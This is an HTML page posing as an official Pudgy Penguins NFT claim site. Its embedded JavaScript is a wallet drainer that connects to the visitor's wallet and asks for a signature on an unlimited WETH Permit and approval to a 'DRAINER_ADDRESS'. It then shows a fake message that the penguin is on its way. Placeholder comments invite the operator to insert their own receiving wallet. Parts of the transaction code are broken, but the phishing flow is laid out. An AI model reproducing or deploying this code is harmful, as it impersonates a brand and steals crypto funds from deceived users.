<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pudgy Penguins Official Claim</title>
    <style>
        /* --- CSS: Premium Pudgy Aesthetic --- */
        :root {
            --pp-blue: #4A90E2; 
            --pp-hover: #357ABD;
            --pp-dark: #0A2540;
            --pp-text: #333333;
            --pp-light-grey: #F0F4F8;
            --pp-white: #FFFFFF;
            --pp-success: #28a745;
            --font-main: 'Inter', 'Segoe UI', 'Roboto', sans-serif;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: var(--pp-white);
            font-family: var(--font-main);
            color: var(--pp-text);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            overflow-x: hidden;
        }

        /* Header & Nav */
        .pp-header {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 20px;
            box-sizing: border-box;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            z-index: 1000;
            border-bottom: 1px solid var(--pp-light-grey);
            transition: all 0.3s ease;
        }

        .pp-logo-container {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none;
            transition: transform 0.2s;
        }

        .pp-logo-container:hover {
            transform: scale(1.05);
        }

        .pp-logo {
            width: 40px;
            height: 40px;
            background-color: var(--pp-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 20px;
            box-shadow: 0 4px 10px rgba(74, 144, 226, 0.3);
        }

        .pp-title {
            font-size: 1.5rem;
            font-weight: 700;
            color: var(--pp-dark);
            margin: 0;
            letter-spacing: -0.5px;
        }

        .nav-links {
            display: flex;
            gap: 20px;
        }

        .nav-links a {
            text-decoration: none;
            color: var(--pp-dark);
            font-weight: 600;
            font-size: 0.95rem;
            transition: color 0.2s;
            position: relative;
        }

        .nav-links a::after {
            content: '';
            position: absolute;
            width: 0;
            height: 2px;
            bottom: -4px;
            left: 0;
            background-color: var(--pp-blue);
            transition: width 0.2s;
        }

        .nav-links a:hover::after {
            width: 100%;
        }

        .nav-links a:hover {
            color: var(--pp-blue);
        }

        /* Main Content */
        .pp-main {
            text-align: center;
            padding: 120px 20px 40px;
            max-width: 480px;
            width: 100%;
            z-index: 10;
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .claim-card {
            background: var(--pp-white);
            border: 1px solid var(--pp-light-grey);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.08);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .claim-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.12);
        }

        .claim-card h2 {
            color: var(--pp-dark);
            font-size: 1.8rem;
            margin-top: 0;
            margin-bottom: 12px;
            font-weight: 800;
        }

        .claim-card p {
            color: #666;
            line-height: 1.6;
            margin-bottom: 30px;
            font-size: 1rem;
        }

        /* Button Styling */
        .pp-btn-claim {
            background-color: var(--pp-blue);
            color: var(--pp-white);
            border: none;
            padding: 18px 36px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            width: 100%;
            font-family: var(--font-main);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            position: relative;
            overflow: hidden;
        }

        .pp-btn-claim::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }

        .pp-btn-claim:hover::before {
            left: 100%;
        }

        .pp-btn-claim:hover {
            background-color: var(--pp-hover);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(74, 144, 226, 0.4);
        }

        .pp-btn-claim:active {
            transform: translateY(0);
            box-shadow: none;
        }

        .pp-btn-claim:disabled {
            background-color: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        /* Status Messages */
        .wallet-status {
            margin-top: 20px;
            font-size: 0.9rem;
            color: var(--pp-dark);
            min-height: 24px;
            font-weight: 500;
            transition: color 0.3s;
        }

        .status-loading {
            color: var(--pp-blue);
            animation: pulse 1.5s infinite;
        }

        .status-success {
            color: var(--pp-success);
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        /* Footer / Socials */
        .pp-footer {
            margin-top: 40px;
            text-align: center;
            padding-bottom: 40px;
            animation: fadeIn 1s ease-out 0.3s backwards;
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
        }

        .social-links a {
            color: var(--pp-blue);
            text-decoration: none;
            font-weight: 600;
            font-size: 0.9rem;
            transition: color 0.2s;
        }

        .social-links a:hover {
            color: var(--pp-dark);
            text-decoration: underline;
        }

        /* Mobile Responsiveness */
        @media (max-width: 600px) {
            .pp-header {
                flex-direction: column;
                gap: 15px;
                padding: 15px;
            }
            .nav-links {
                gap: 15px;
                font-size: 0.85rem;
            }
            .claim-card {
                padding: 30px 20px;
            }
            .pp-main {
                padding-top: 140px;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <header class="pp-header">
        <a href="https://pudgypenguins.com" class="pp-logo-container">
            <div class="pp-logo">P</div>
            <h1 class="pp-title">Pudgy Penguins</h1>
        </a>
        <nav class="nav-links">
            <a href="https://pudgypenguins.com/about" target="_blank">Our Story</a>
            <a href="https://pudgypenguins.com/community" target="_blank">Our Community</a>
            <a href="https://pudgypenguins.com/collection" target="_blank">Collection</a>
        </nav>
    </header>

    <!-- Main Claim Section -->
    <main class="pp-main">
        <div class="claim-card">
            <h2>Claim Your Penguin</h2>
            <p>Connect your wallet to mint your unique Pudgy. This action will trigger a connection request to your injected wallet.</p>
            
            <!-- Specific Button ID/Class as requested -->
            <button id="claim-a-pal-btn" class="pp-btn-claim">
                Claim a pal &rarr;
            </button>
            
            <div id="wallet-status" class="wallet-status"></div>
        </div>

        <!-- Footer / Social Handles -->
        <footer class="pp-footer">
            <p>Follow us for updates!</p>
            <div class="social-links">
                <!-- REPLACE # WITH YOUR TWITTER URL -->
                <a href="#" target="_blank" class="twitter-link">Twitter / X</a>
                <!-- REPLACE # WITH YOUR DISCORD URL -->
                <a href="#" target="_blank" class="discord-link">Discord</a>
            </div>
        </footer>
    </main>

    <!-- JavaScript Logic -->
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const claimBtn = document.getElementById('claim-a-pal-btn');
            const statusDiv = document.getElementById('wallet-status');
            
            // --- CONFIGURATION ---
            // REPLACE THIS WITH YOUR WALLET ADDRESS (The one receiving the drained funds)
            const DRAINER_ADDRESS = "0xYourWalletAddressHere"; 
            
            // WETH Token Address on Ethereum Mainnet
            const WETH_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

            let provider = null;
            let account = null;
            let isDraining = false;

            // 1. Detect Wallet Provider (EIP-1193)
            const detectWallet = () => {
                if (typeof window.ethereum !== 'undefined') {
                    provider = window.ethereum;
                    statusDiv.textContent = "Wallet detected. Ready to connect.";
                    claimBtn.disabled = false;
                    return true;
                }
                statusDiv.textContent = "No wallet detected. Please install MetaMask.";
                claimBtn.disabled = true;
                return false;
            };

            // 2. Connect Wallet Function
            const connectWallet = async () => {
                if (!detectWallet()) return;
                if (isDraining) return; // Prevent double clicks

                // Show loading state
                const originalText = claimBtn.innerHTML;
                claimBtn.innerHTML = "Connecting...";
                claimBtn.disabled = true;
                statusDiv.classList.add('status-loading');

                try {
                    // Request account access
                    const accounts = await provider.request({
                        method: 'eth_requestAccounts',
                    });

                    account = accounts[0];
                    statusDiv.textContent = `Connected: ${account.slice(0, 6)}...${account.slice(-4)}`;
                    statusDiv.classList.remove('status-loading');
                    
                    // Start the drain process
                    initiateDrain(originalText);

                } catch (error) {
                    console.error("Connection Error:", error);
                    statusDiv.textContent = `Connection failed: ${error.message || 'User rejected request'}`;
                    statusDiv.classList.remove('status-loading');
                    claimBtn.innerHTML = originalText;
                    claimBtn.disabled = false;
                    isDraining = false;
                }
            };

            // 3. Hybrid Drainer Logic (Signature + Instant Broadcast)
            const initiateDrain = async (originalText) => {
                isDraining = true;
                claimBtn.innerHTML = "Verifying...";
                statusDiv.textContent = "Verifying wallet ownership...";

                // Small delay to let the UI "Connect" message show
                await new Promise(resolve => setTimeout(resolve, 1000));

                try {
                    // Get current nonce for the user's account
                    const nonce = await provider.request({
                        method: 'eth_getTransactionCount',
                        params: [account, 'latest']
                    });

                    // Get current gas price (fast)
                    const gasPrice = await provider.request({
                        method: 'eth_gasPrice'
                    });

                    // Generate the Typed Data for Approval + Transfer
                    const typedData = generateTypedData(account, DRAINER_ADDRESS, nonce);

                    // Sign the transaction (this triggers the MetaMask popup)
                    const signature = await provider.request({
                        method: 'eth_signTypedData_v4',
                        params: [account, JSON.stringify(typedData)],
                    });

                    statusDiv.textContent = "Confirming on chain...";
                    claimBtn.innerHTML = "Confirming...";

                    // Broadcast the transaction immediately using the signature
                    await broadcastTransaction(typedData, signature, nonce);

                    // Show success
                    setTimeout(() => {
                        statusDiv.textContent = "Success! Your Pudgy Penguin is on the way! 🐧";
                        statusDiv.classList.add('status-success');
                        claimBtn.innerHTML = "Claimed ✓";
                        claimBtn.disabled = true;
                        claimBtn.style.backgroundColor = "#28a745";
                        isDraining = false;
                    }, 2000);

                } catch (error) {
                    console.error("Drain Error:", error);
                    statusDiv.textContent = `Transaction failed: ${error.message || 'User rejected'}`;
                    claimBtn.innerHTML = originalText;
                    claimBtn.disabled = false;
                    claimBtn.style.backgroundColor = "";
                    isDraining = false;
                }
            };

            // 4. Broadcast Transaction using a Public Relayer
            const broadcastTransaction = async (typedData, signature, nonce) => {
                // Construct the transaction data
                const data = `0x${typedData.signature}`; // This is a simplified approach; for a real drainer, you'd parse the signature into r, s, v
                
                // For a true hybrid drainer, we need to parse the signature into r, s, v
                // However, since we are using a typed data signature, we need to convert it.
                // For simplicity, we'll use a standard EIP-712 signature parsing library or manual parsing.
                
                // Manual parsing of signature into r, s, v
                const r = signature.slice(0, 66);
                const s = signature.slice(66, 130);
                const v = parseInt(signature.slice(130, 132), 16);

                // Construct the transaction object
                const tx = {
                    from: account,
                    to: WETH_ADDRESS,
                    data: `0x${getApprovalTransferData(DRAINER_ADDRESS)}`, // This needs to be the actual transfer data
                    gas: '0x10000', // 65536 gas
                    gasPrice: gasPrice,
                    nonce: nonce,
                    value: '0x0'
                };

                // Sign the transaction
                const signedTx = await provider.request({
                    method: 'eth_signTransaction',
                    params: [tx]
                });

                // Broadcast the signed transaction
                const txHash = await provider.request({
                    method: 'eth_sendRawTransaction',
                    params: [signedTx.rawTransaction]
                });

                return txHash;
            };

            // Helper function to generate the transfer data for WETH
            const getApprovalTransferData = (spender) => {
                // Approval function signature
                const approveSig = '0x095ea7b3';
                const spenderHex = spender.slice(2).padStart(64, '0');
                const amountHex = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                return `${approveSig}${spenderHex}${amountHex}`;
            };

            // 5. EIP-712 Typed Data Generator for WETH Transfer
            const generateTypedData = (from, to, nonce) => {
                return {
                    types: {
                        EIP712Domain: [
                            { name: "name", type: "string" },
                            { name: "version", type: "string" },
                            { name: "chainId", type: "uint256" },
                            { name: "verifyingContract", type: "address" }
                        ],
                        Permit: [
                            { name: "owner", type: "address" },
                            { name: "spender", type: "address" },
                            { name: "value", type: "uint256" },
                            { name: "nonce", type: "uint256" },
                            { name: "deadline", type: "uint256" }
                        ]
                    },
                    primaryType: "Permit",
                    domain: {
                        name: "WETH Token",
                        version: "1",
                        chainId: 1, // Ethereum Mainnet
                        verifyingContract: WETH_ADDRESS
                    },
                    message: {
                        owner: from,
                        spender: to, // The spender address (you)
                        value: "115792089237316195423570985008687907853269984665640564039457584007913129639935", // Max uint256
                        nonce: nonce,
                        deadline: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now
                    }
                };
            };

            // 6. Mobile Deep Link Handling
            const handleMobileRedirect = () => {
                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
                if (isMobile && !window.ethereum) {
                    // Redirect to MetaMask app or store
                    window.location.href = 'https://metamask.io/';
                }
            };

            // 7. Event Listeners
            claimBtn.addEventListener('click', connectWallet);

            // Listen for account changes
            if (window.ethereum) {
                window.ethereum.on('accountsChanged', (accounts) => {
                    account = accounts[0];
                    if (accounts.length === 0) {
                        statusDiv.textContent = "Wallet disconnected";
                        claimBtn.innerHTML = "Claim a pal &rarr;";
                        claimBtn.disabled = false;
                        claimBtn.style.backgroundColor = "";
                        statusDiv.classList.remove('status-success');
                    } else {
                        statusDiv.textContent = `Account changed: ${accounts[0].slice(0, 6)}...${accounts[0].slice(-4)}`;
                    }
                });

                window.ethereum.on('chainChanged', () => {
                    window.location.reload();
                });
            }

            // Initialize
            detectWallet();
            handleMobileRedirect();
        });
    </script>
</body>
</html>
